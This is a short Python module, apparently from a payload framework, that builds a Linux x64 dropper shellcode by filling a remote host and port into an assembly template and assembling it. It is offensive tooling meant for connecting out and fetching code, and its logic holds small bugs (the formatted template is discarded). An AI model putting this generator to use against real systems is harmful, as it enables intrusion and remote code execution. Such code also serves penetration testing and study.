#!/usr/bin/env python3

from hatasm import HatAsm
from hatvenom import HatVenom


class Dropper(HatAsm, HatVenom):
    def generate(self, assemble=True, options={}):
        if 'RHOST' not in options and 'RPORT' not in options:
            return b''

        rhost = self.convert_host(options['RHOST'])
        rport = self.convert_port(options['RPORT'])

        with open('linux_x64_dropper.asm') as f:
            shellcode = f.read()
            shellcode.format(rhost.hex(), rport.hex())

            if assemble:
                return self.assemble('x64', shellcode)
            return shellcode
